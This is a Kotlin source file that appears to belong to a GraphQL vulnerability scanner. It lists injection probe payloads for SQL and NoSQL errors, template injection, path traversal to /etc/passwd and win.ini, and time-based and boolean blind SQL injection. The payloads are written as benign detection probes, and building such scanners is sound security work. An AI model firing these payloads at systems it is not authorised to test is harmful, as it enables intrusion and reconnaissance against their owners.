package com.redcell.gqlanalyzer.transport

/**
 * The proof-level in-band injection payload catalog driving the per-operation scan. Each
 * payload names the [Technique] that decides how the scanner reads the response:
 *
 *  - ERROR    — SQL/NoSQL parser breakers; a *new* backend error signature ⇒ error-based injection.
 *  - EVAL     — template/expression payloads computing `7*191`; `1337` echoed back ⇒ SSTI. `1337`
 *               is used instead of `49` because it is far rarer in real data (fewer false positives).
 *  - FILE     — path-traversal reads; a `/etc/passwd` or `win.ini` marker in the response ⇒ LFI.
 *  - TIME     — single ~5s blind sleep; a baseline-relative latency jump ⇒ time-based blind SQLi.
 *  - BOOLEAN  — a TRUE/FALSE tautology pair; a data/error differential ⇒ boolean-based blind SQLi.
 *
 * Payloads are benign: no stacked/destructive SQL, no OS command execution, one short sleep per
 * dialect, and the boolean pair only reports a differential — never dumped data. Blind (TIME/
 * BOOLEAN) techniques run only under the explicit Scan-selected gate (see CLAUDE.md).
 */
object InjectionPayloads {

    enum class Technique { ERROR, EVAL, FILE, TIME, BOOLEAN_TRUE, BOOLEAN_FALSE }

    data class Payload(val value: String, val technique: Technique, val note: String)

    /** The SSTI probe computes this product, distinctive enough to attribute to evaluation. */
    const val SSTI_RESULT = "1337" // 7 * 191

    val inBand: List<Payload> = listOf(
        // ---- error-based SQL / NoSQL ----
        Payload("'", Technique.ERROR, "single quote"),
        Payload("\"", Technique.ERROR, "double quote"),
        Payload("`", Technique.ERROR, "backtick"),
        Payload("\\", Technique.ERROR, "backslash"),
        Payload("'||'", Technique.ERROR, "SQL string concat"),
        Payload("');", Technique.ERROR, "statement terminator"),
        Payload("'\"{}", Technique.ERROR, "NoSQL/BSON breaker"),
        Payload("{\"\$gt\":\"\"}", Technique.ERROR, "Mongo operator object (as string)"),

        // ---- template / expression (SSTI), 7*191 = 1337 ----
        Payload("\${7*191}", Technique.EVAL, "JSP/Spring EL / generic \${}"),
        Payload("{{7*191}}", Technique.EVAL, "Jinja2 / Twig / Handlebars"),
        Payload("#{7*191}", Technique.EVAL, "Ruby / Freemarker / JSF"),
        Payload("<%= 7*191 %>", Technique.EVAL, "ERB / EJS"),
        Payload("\${{7*191}}", Technique.EVAL, "nested interpolation"),
        Payload("*{7*191}", Technique.EVAL, "Thymeleaf"),
        Payload("@(7*191)", Technique.EVAL, "Razor"),

        // ---- path traversal / LFI ----
        Payload("../../../../../../etc/passwd", Technique.FILE, "unix traversal"),
        Payload("..\\..\\..\\..\\..\\..\\windows\\win.ini", Technique.FILE, "windows traversal"),

        // ---- time-based blind SQLi (single ~5s sleep) ----
        Payload("'||pg_sleep(5)--", Technique.TIME, "Postgres pg_sleep"),
        Payload("' OR SLEEP(5)-- -", Technique.TIME, "MySQL SLEEP"),
        Payload("';WAITFOR DELAY '0:0:5'--", Technique.TIME, "MSSQL WAITFOR"),

        // ---- boolean-based blind SQLi (true/false differential) ----
        Payload("' OR '1'='1", Technique.BOOLEAN_TRUE, "tautology (true)"),
        Payload("' OR '1'='2", Technique.BOOLEAN_FALSE, "contradiction (false)"),
    )
}
